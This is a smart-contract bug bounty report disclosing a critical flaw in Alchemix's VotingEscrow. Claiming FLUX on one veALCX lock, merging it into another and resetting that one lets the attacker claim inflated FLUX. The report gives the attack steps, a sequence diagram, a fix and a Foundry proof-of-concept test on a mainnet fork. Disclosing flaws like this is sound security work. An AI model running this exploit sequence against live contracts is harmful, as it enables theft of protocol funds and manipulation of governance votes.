# 30800 - \[SC - Critical] Stealing FLUX by claiming then merging position...

Submitted on May 6th 2024 at 11:30:27 UTC by @infosec\_us\_team for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30800

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
* Protocol insolvency
* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Brief/Intro

Attackers can claim more FLUX than accrued.

## Vulnerability Details

The attack vector is easy to understand.

**ATTACK VECTOR**

1- The attacker creates 2 (or more) locks in the *VotingEscrow*.

> For the sake of simplicity let's imagine he only created 2. We'll refer to the ids of the NFTs minted as `tokenId1` and `tokenId1`

2- Move forward in time to the next epoch.

3- The attacker calls `Voter.reset(tokenId1)` and accrues rewards for his token with id `tokenId1` based on the balance of BPT he deposited when minting the NFT.

4- The attacker claims the FLUX accrued by calling `flux.claimFlux(tokenId1, amount)`

5- The attacker merges the balance inside `tokenId1` with the balance inside `tokenId2` by calling `veALCX.merge(tokenId1, tokenId2);`

6- Now that his second NFT (`tokenId2`) has the double of BPT balance inside, he calls `Voter.reset(tokenId2)` and accrues rewards for his token with id `tokenId2`.

7- The attacker now claims the inflated FLUX accrued in `tokenId2` by calling `flux.claimFlux(tokenId2, inflated_amount)`

Here's a sequence diagram:

> After creating both locks the attacker must wait until the next epoch to proceed, we omitted the "wait" step in this diagram for simplicity.

```
 ┌────────┐                                      ┌──────┐┌─────┐┌────┐
 │Attacker│                                      │veALCX││Voter││FLUX│
 └───┬────┘                                      └──┬───┘└──┬──┘└─┬──┘
     │                                              │       │     │   
     │             createLock tokenId1              │       │     │   
     │─────────────────────────────────────────────>│       │     │   
     │                                              │       │     │   
     │             createLock tokenId2              │       │     │   
     │─────────────────────────────────────────────>│       │     │   
     │                                              │       │     │   
     │       reset tokenId1 + accrue tokenId1's FLUX│       │     │   
     │─────────────────────────────────────────────────────>│     │   
     │                                              │       │     │   
     │merge the BPT balance of tokenId1 and tokenId2│       │     │   
     │─────────────────────────────────────────────>│       │     │   
     │                                              │       │     │   
     │       reset tokenId2 + accrue tokenId2's FLUX│       │     │   
     │─────────────────────────────────────────────────────>│     │   
     │                                              │       │     │   
     │                       claim all FLUX         │       │     │   
     │───────────────────────────────────────────────────────────>│   
 ┌───┴────┐                                      ┌──┴───┐┌──┴──┐┌─┴──┐
 │Attacker│                                      │veALCX││Voter││FLUX│
 └────────┘                                      └──────┘└─────┘└────┘

```

If instead of doing it with 2 tokens, it is done with 3, after the last step the attacker can merge `tokenId2` with `tokenId3`, reset 3, and claim even more FLUX (a value relative to the full balance of `tokenId1` + the balance of `tokenId2` + the balance of `tokenId3`).

## Recommendation

When merging the balance of `tokenId1` into `tokenId2`, make sure to claim all `tokenId2`'s rewards if we are in a new epoch, before increasing the internal balance of `tokenId2`.

## Impact Details

FLUX can be used to boost the voting power of an NFT holder or as an ERC20 token that can be traded in the open market.

The consequences of gaming the system to claim more FLUX than accrued are:

* Protocol insolvency.
* Manipulation of governance voting.
* Direct theft of funds.

## Proof of Concept

Remember to run the code with the correct block number (the one used in your tests: 17133822)

We run the test executing:

```
forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/{API_KEY} --match-test testFluxAccrualAndMerge --fork-block-number 17133822 -vv
```

> Replace {API\_KEY} with your API key.

To test how much FLUX the user should have accrued, add a comment to the "`veALCX.merge(tokenId1, tokenId2);`"

The code for the test:

```

    function testFluxAccrualAndMerge() public {

        address user = address(0x0123);

        uint256 tokenId1 = createVeAlcx(user, TOKEN_1, MAXTIME, true);
        uint256 tokenId2 = createVeAlcx(user, TOKEN_1, MAXTIME, true);

        hevm.startPrank(user);

        voter.reset(tokenId1);
        voter.reset(tokenId2);

        hevm.warp(newEpoch());
        voter.distribute();

        console2.log("balance of token1", veALCX.balanceOfTokenAt(tokenId1, block.timestamp));
        console2.log("balance of token2", veALCX.balanceOfTokenAt(tokenId2, block.timestamp));

        voter.reset(tokenId1);

        flux.claimFlux(tokenId1, flux.getUnclaimedFlux(tokenId1));

        veALCX.merge(tokenId1, tokenId2);

        voter.reset(tokenId2);

        flux.claimFlux(tokenId2, flux.getUnclaimedFlux(tokenId2));
        
        console2.log("balance of flux", flux.balanceOf(user));

        hevm.stopPrank();

    }

```
